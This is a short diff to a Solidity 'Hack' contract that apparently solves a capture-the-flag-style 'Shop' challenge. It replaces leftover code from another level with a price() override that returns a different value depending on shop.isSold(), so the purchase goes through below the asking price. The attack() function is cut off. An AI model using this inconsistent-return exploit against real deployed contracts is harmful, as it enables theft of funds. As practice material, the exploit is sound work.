@@ -19,20 +19,15 @@ contract Shop {
     }
 }
 
-contract Hack {
+contract Hack is Buyer {
     Shop public shop;
-    Buyer public buyer;
-    uint private floorCounter;
 
     constructor(address _shopAddress) {
-        buyer = Buyer(address(this));
         shop = Shop(_shopAddress);
     }
 
-    function isLastFloor(uint _floor) external returns (bool) {
-        _floor = floorCounter;
-        floorCounter++;
-        return _floor == 0 ? false : true;
+    function price() external view override returns (uint) {
+        return shop.isSold() ? 0 : 100;
     }
 
     function attack() external {
